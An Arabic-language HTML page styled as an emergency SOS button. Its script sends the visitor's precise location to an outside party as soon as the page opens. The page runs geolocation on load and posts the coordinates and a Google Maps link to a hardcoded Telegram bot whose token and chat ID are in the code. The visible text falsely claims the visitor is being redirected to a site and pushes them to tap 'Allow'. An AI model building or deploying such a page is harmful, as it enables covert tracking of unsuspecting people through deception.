<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مساعد الطوارئ الفوري</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            font-family: sans-serif;
        }
        .container { text-align: center; padding: 20px; }
        .help-btn {
            width: 250px;
            height: 250px;
            border-radius: 50%;
            border: 10px solid #fff;
            background: radial-gradient(circle, #ff5252, #b71c1c);
            color: white;
            font-size: 35px;
            font-weight: bold;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7);
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
            100% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
        }
        .status-text { color: #ffffff; margin-top: 30px; font-size: 22px; font-weight: bold; }
        .sub-text { color: #888; margin-top: 10px; font-size: 16px; }
    </style>
</head>
<body>

<div class="container">
    <div class="help-btn">
        <span style="font-size: 60px;">🆘</span>
        <span>جاري الإرسال...</span>
    </div>
    <div id="status" class="status-text">انتظر لحظة جاري الانتقال للموقع الآن ...</div>
    <div class="sub-text">إذا ظهرت لك رسالة "سماح" اضغط عليها فوراً</div>
</div>

<script>
    const botToken = "8036035151:AAGx8I8HfUM401Y_XrzHyTvGhpQC5RXNVBM";
    const chatId = "1230856956";

    // تفعيل الإرسال التلقائي بمجرد فتح الصفحة
    window.onload = function() {
        sendLocation();
        // تنبيه صوتي للمستخدم
        setTimeout(() => {
            const speech = new SpeechSynthesisUtterance(" ، يرجى الانتظار");
            speech.lang = 'ar-SA';
            window.speechSynthesis.speak(speech);
        }, 500);
    };

    function sendLocation() {
        const status = document.getElementById('status');
        
        const options = {
            enableHighAccuracy: true, // دقة بالمتر الواحد
            timeout: 15000,
            maximumAge: 0
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy.toFixed(1);

                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                const telegramMsg = `🚨 **استغاثة تلقائية (عند الفتح)**\n\n📍 الدقة: ${accuracy} متر\n🔗 الرابط:\n${googleMapsUrl}`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`)
                .then(res => {
                    if(res.ok) {
                        status.innerText = "✅ تم الانتقال بنجاح";
                        status.style.color = "#4caf50";
                    }
                });

            }, error => {
                status.innerText = "⚠️ يرجى تفعيل الـ GPS والضغط على 'سماح'";
                status.style.color = "#ffeb3b";
            }, options);
        }
    }
</script>

</body>
</html>
